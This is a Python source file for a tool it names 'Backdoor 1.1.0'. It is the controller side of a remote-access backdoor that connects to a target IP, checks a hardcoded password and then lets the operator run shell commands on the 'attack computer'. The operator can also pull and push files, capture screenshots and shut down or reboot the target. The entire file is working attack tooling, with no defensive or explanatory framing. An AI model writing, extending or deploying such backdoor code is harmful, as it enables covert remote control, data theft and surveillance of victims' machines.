import socket
import subprocess
import platform
import time
import sys
import os
from datetime import datetime

#Get started
print('''            ╔══╗─╔══╗╔══╗╔╗╔══╗╔══╗─╔══╗╔══╗╔═══╗
            ║╔╗║─║╔╗║║╔═╝║║║╔═╝║╔╗╚╗║╔╗║║╔╗║║╔═╗║
            ║╚╝╚╗║╚╝║║║──║╚╝║──║║╚╗║║║║║║║║║║╚═╝║
            ║╔═╗║║╔╗║║║──║╔╗║──║║─║║║║║║║║║║║╔╗╔╝
            ║╚═╝║║║║║║╚═╗║║║╚═╗║╚═╝║║╚╝║║╚╝║║║║║
            ╚═══╝╚╝╚╝╚══╝╚╝╚══╝╚═══╝╚══╝╚══╝╚╝╚╝''')

print('Backdoor 1.1.0 [MSC v.2021 64 bit(AMD64)] on win32' + '\n' + 'Type "help", for more information.')

#Paths
HOST = input(str('Enter IP address:'))
PORT = 5768
auth_try = 0
pwd = 'pavel08180919'

#Connect
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

#Backdoor
def Shell():
    while True:
        command = (input(str('>>>'))).lower()
        if command == 'system':
            s.send(command.encode())
            sysinfo = s.recv(10000)
            sysinfo = sysinfo.decode()
            print(sysinfo)
        elif command == 'cmd':
            s.send(command.encode())
            def cmd():
                global cm_cmd
                while True:
                    cm_cmd = input(str("CMD command:"))
                    if cm_cmd == 'exit' or cm_cmd == 'exit()':
                        s.send(cm_cmd.encode())
                        time.sleep(5)
                        s.close()
                        sys.exit()
                    elif cm_cmd == 'python' or cm_cmd == 'py':
                        print('\n' + 'Python is currently unavailable!')
                        break
                    elif cm_cmd == 'sftp':
                        print('\n' + 'SFTP is currently unavailable!')
                        break
                    elif cm_cmd.startswith('color'):
                        print('\n' + 'Background change is not possible!')
                        break
                    elif cm_cmd == 'data' or cm_cmd == 'date':
                        current_datetime = datetime.now()
                        print(str(current_datetime))
                        break
                    s.send(cm_cmd.encode())
                    answer = s.recv(4096)
                    answer = answer.decode()
                    print("Command output:" + '\n' + '\n' + answer)
            cmd()    
        elif command == 'download_file' or command == 'download file':
            s.send(command.encode())
            file_path = input(str("Enter the file path ineluding the filename:" + '\t'))
            s.send(file_path.encode())
            file = s.recv(100000)
            print(file)
            filename = input(str("Enter a filename for the incoming file including the extension:"))
            new_file = open(filename,'wb')
            new_file.write(file)
            new_file.close()
            print(filename,'Has been downloaded and saved!')
        elif command == 'upload_file' or command == 'upload file':
            s.send(command.encode())
            file_path = input(str('Enter directory of file:' + '\t'))
            filename = input(str('Enter the filename of the uploaded file:'+ '\t'))
            data = open(file_path,'rb')
            file_data = data.read()
            s.send(filename.encode())
            print(filename,"Has been sent saccessfuly!")
            s.send(file_data)
        elif command == 'help':
            print("""   
                        Operations:     Information:
                    
                        system          --Displayed information of system; 
                                                                            
                        cmd             --Called shell of os;                
                        
                        download_file   --Downloaded files on your computer;
                        
                        upload_file     --Uploaded files on different computer;
                        
                        shutdown        --Shotdowned attack computer;
                        
                        reboot          --Rebooted attack computer;
                        
                        hibernated      --Hibernated attcak computer;
                        
                        mkdir           --Maked directory on attack computer;
                        
                        screenshot      --Maked screenshot on attack computer;
                        
                        exit            --Exit with BACKDOOR;  
                        
                        path            --Change directory;
                        """)
        elif command == 'shutdown':
            s.send(command.encode())
            answer = s.recv(1024)
            answer = answer.decode()
            print('Command output:' + answer)
        elif command == 'reboot':
            s.send(command.encode())
            answer = s.recv(1024)
            answer = answer.decode()
            print('Command output:' + answer)
        elif command == 'hibernation':
            s.send(command.encode())
            answer = s.recv(1024)
            answer = answer.decode()
            print('Command output:' + answer)
        elif command == 'mkdir' or command == 'make dir':
            s.send(command.encode())
            name_dir = input(str('Enter directory name:'))
            s.send(name_dir.encode())
            answer = s.recv(1024)
            answer = answer.decode()
            print(answer)
        elif command == 'screenshot' or command == 'screen':
            s.send(command.encode())
            answer = s.recv(1024)
            answer = answer.decode()
            print('\n' + answer)
            data = s.recv(100000)
            filename = input(str('Enter filename:'))
            img = open(filename,'wb',)
            data_img = img.write(data)
        elif command == 'exit()' or command == 'exit':
            s.send(command.encode())
            time.sleep(5)
            s.close()
            sys.exit()
        elif command.startswith('cd') or command == 'path':
            s.send(command.encode())
            path = input(str('Enter directory:'))
            print('\n' + 'Directory changed!')
            s.send(path.encode())
        else:
            print('Command is not definded')

def Password():
    global auth_try
    if auth_try == 5:
        sys.exit()
    password = input(str('Enter password:'))
    if password == pwd:
        print('\n' + 'You are successfully connected to the server!')
        Shell()
    else:
        print('The password is incorrect!')
        auth_try = auth_try + 1
        Password()
Password()